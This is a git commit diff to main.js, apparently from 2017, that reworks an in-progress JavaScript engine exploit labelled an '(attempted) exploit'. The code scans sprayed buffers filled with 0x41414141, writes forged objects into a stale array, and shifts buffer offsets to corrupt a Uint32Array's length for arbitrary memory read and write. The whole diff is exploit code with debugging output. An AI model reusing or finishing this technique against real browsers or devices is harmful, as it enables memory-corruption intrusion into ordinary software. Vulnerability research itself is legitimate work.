c878e9182201e94dac244b5cd31a0bfef381433a
Cody Brocious <cody.brocious@gmail.com>
2017-03-04 04:34:24 -0700

    Shifted some things around.  Cleaned up the (attempted) exploit.

--- main.js
+++ main.js
@@ -114,55 +114,44 @@ function doItAll() {
 		return;
 	}
 
-	stale[0] = 0xDEADBEEF;
-
-	var smsh = new Uint32Array(0x10);
+	stale[5] = 0xDEADBEEF;
 
 	log('Attempting to find buffer');
 
+	function dumpbuf(count) {
+		for(var j = 0; j < count; ++j)
+			log('Buf[' + j + '] == 0x' + buf[k + j].toString(16));
+	}
+
+	var rwu32 = new Uint32Array(0x10);
+
 	for (i=0; i < bufs.length; i++) {
 		for (k=0; k < bufs[i].length; ) {
-			function dumpbuf(count) {
-				for(var j = 0; j < count; ++j)
-					log('Buf[' + j + '] == 0x' + bufs[i][k + j].toString(16));
-			}
 			if(bufs[i][k] != 0x41414141){
-				stale[0] = {'a':u2d(0x60, 0x1172600),'b':u2d(0,0),'c':smsh,'d':u2d(0x100,0)};
-				stale[1] = stale[0];
-				log(stale[0]);
+				var buf = tlbuf = bufs[i];
+				tlstale = stale;
+				tlk = k;
+
+				stale[5] = {'a':u2d(0x60, 0x1172600),'b':u2d(0,0),'c':rwu32,'d':u2d(0x100,0)};
+				stale[6] = stale[5];
+				log(stale[5]);
+
 				log('Dumping partial buffer...');
 				dumpbuf(8);
+
 				var off = 0x10;
-				bufs[i][k] += off;
-				log('Attempting to assign...');
-				//stale[0] = [];
-				/*stale[0][4] = 0;
-				log('...');
-				stale[0][5] = 1;
-				log('...');
-				stale[0][6] = 0xffffffff;*/
-				log('Moving back...');
-				bufs[i][k] -= off;
-				//log(stale[0]);
-				log('smsh len: 0x' + smsh.length.toString(16));
-				//log(smsh);
-				log('Dumping partial buffer after...');
+
+				buf[k] += off;
+				log(stale[5]);
+				//log(stale[5][0]);
+				stale[5][6] = 0x69;
+				buf[k] -= off;
+
+				log('Checking...');
+				//log(stale[5]);
+				log(rwu32.length);
+				log('Dumping partial buffer...');
 				dumpbuf(8);
-				return;
-
-				//stale[6][4] = 0; // address, low 32 bits
-				//stale[6][5] = 1; // address, high 32 bits == 0x100000000
-				log('set len...');
-				//stale[6][6] = 0x20;
-				//stale[6] = 0x20;
-				//log(stale[6][6]);
-				log('test!');
-
-				if (smsh.length == 0x20) {
-					log("win!");
-				} else
-					log("fail");
-
 				return;
 			}
 			k++;
